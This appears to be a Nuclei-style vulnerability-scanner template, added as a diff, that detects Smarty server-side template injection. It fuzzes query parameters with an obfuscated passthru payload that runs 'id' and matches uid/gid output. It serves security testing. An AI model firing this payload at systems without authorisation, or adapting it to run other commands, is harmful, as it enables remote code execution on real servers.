@@ -1,0 +1,36 @@
+id: smarty-ssti
+
+info:
+  name: Smarty - Server Side Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    In PHP template engine Smarty, template injection is possible by exploiting the passthru function combined with array_map and chr.
+  reference:
+    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+  metadata:
+    max-request: 1
+  tags: smarty,ssti,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
